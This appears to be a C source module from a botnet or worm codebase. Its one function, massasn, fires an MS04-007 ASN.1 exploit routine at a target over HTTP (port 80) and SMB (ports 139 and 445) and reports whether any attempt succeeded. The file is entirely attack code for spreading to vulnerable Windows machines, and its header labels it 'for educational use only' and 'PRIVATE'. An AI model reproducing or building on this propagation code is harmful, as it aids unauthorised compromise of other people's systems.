/*************************************************************
 *    Experiment code by Depth45. For educational use only   *
 *                       MASSASN                             *
 *                       PRIVATE                             *
 *************************************************************/




#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MS04007ASN1
#ifndef NO_DEPTH5


bool massasn(EXINFO exinfo) {
	exinfo.port = 80;
	bool bASN1HTTP = MS04_007_MSASN1_PortedByScriptGod(exinfo);
	exinfo.port = 139;
	bool bASN1SMBNT = MS04_007_MSASN1_PortedByScriptGod(exinfo);
	exinfo.port = 445;
	bool bASN1SMB = MS04_007_MSASN1_PortedByScriptGod(exinfo);
	return bASN1HTTP || bASN1SMB || bASN1SMBNT  ? true : false;
}

#endif
#endif
